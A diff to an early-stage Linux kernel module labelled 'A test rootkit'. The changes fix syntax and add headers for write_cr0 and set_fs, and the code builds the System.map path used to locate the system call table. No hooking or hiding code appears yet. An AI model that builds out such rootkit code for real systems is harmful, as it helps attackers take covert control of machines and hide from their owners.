@@ -1,8 +1,13 @@
-#include <linux/module.h>    // included for all kernel modules
-#include <linux/kernel.h>    // included for KERN_INFO
-#include <linux/init.h>      // included for __init and __exit macros
+#include <linux/module.h>  /* Needed by all kernel modules */
+#include <linux/kernel.h>  /* Needed for loglevels (KERN_WARNING, KERN_EMERG, KERN_INFO, etc.) */
+#include <linux/init.h>    /* Needed for __init and __exit macros. */
+#include <linux/unistd.h>  /* sys_call_table __NR_* system call function indices */
+#include <linux/fs.h>      /* filp_open */
+#include <linux/slab.h>    /* kmalloc */
+#include <asm/paravirt.h> /* write_cr0 */
+#include <asm/uaccess.h>  /* get_fs, set_fs */
+#include <asm/paravirt.h> /* write_cr0 */
 #include <linux/utsname.h>
-#include <linux/slab.h>
 
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("A test rootkit");
@@ -11,7 +16,7 @@ char * get_map_file(void) {
 
   int MAX_FILESIZE;
   MAX_FILESIZE = 100;
-  char base_filename[] =  "/boot/System.map-";
+  char base_filename[] = "/boot/System.map-";
   char * kernel_release = utsname()->release;
   char * kernel_release_buff = kmalloc(MAX_FILESIZE, GFP_KERNEL);
 
@@ -24,15 +29,15 @@ char * get_map_file(void) {
   return kernel_release_buff;
 }
 
-int find_sys_call_table(char * map_filename, size_t map_filename_size) {
+void find_sys_call_table(char * map_filename, size_t map_filename_size) {
 
   struct file *f;
 
   mm_segment_t oldfs;
   oldfs = get_fs();
-  set_fs(KERNEL_DS)
+  set_fs(KERNEL_DS);
 
-  print(KERN_WARNING "%s\n", map_filename);
+  printk(KERN_WARNING "%s\n", map_filename);
 
 }
 
